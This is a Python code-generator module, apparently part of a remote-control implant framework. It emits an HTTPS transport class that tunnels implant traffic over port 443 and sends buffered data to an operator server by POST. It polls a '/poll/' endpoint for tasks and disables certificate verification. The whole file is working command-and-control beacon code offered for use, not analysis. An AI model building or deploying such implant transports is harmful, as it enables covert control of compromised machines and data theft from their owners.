"""
@module: transport_https
@desc: 生成 HTTPS 传输实现代码（f8，流量混入 443，自签证书）
@params: host port key_hex
"""
MODULE = {
    "desc": "生成 HTTPS 传输实现代码（POST 隧道，自签证书）",
    "params": [
        ("host", "必填，HTTPS 监听地址"),
        ("port", "必填，HTTPS 监听端口"),
        ("key_hex", "必填，server implant_key"),
    ],
}


def run(host, port, key_hex):
    """生成 _nT() 实现：HttpSocket（sendall 缓存 → POST → recv 缓存响应）。

    与 implant 的 p()/q() 兼容：sendall/recv 语义不变。
    _HS 每次 recv 首字节时发一次 POST（body=缓存帧），响应缓存供
    后续 recv 读取；空缓存 POST 即轮询取任务。
    """
    host = str(host)
    port = int(port)

    code = f'''\
import urllib.request as _ur, ssl as _sl
class _HS:
    def __init__(s, h, p):
        s._h, s._p = h, p
        s._buf = b""
        s._resp = b""
        s._bid = ""
    def settimeout(s, t):
        pass
    def sendall(s, data):
        s._buf += data
        s._resp = b""
    def recv(s, n):
        if not s._resp:
            s._resp = s._post()
        out, s._resp = s._resp[:n], s._resp[n:]
        return out
    def _post(s):
        ctx = _sl._create_unverified_context()
        url = f"https://{{s._h}}:{{s._p}}/poll/{{s._bid}}"
        req = _ur.Request(url, data=s._buf, method="POST")
        s._buf = b""
        with _ur.urlopen(req, context=ctx, timeout=30) as r:
            return r.read()
    def close(s):
        pass
def _nT():
    s = _HS({host!r}, {port})
    s._bid = _D
    return s
'''
    return code


if __name__ == "__main__":
    print(run("127.0.0.1", 8443, "ab" * 32))
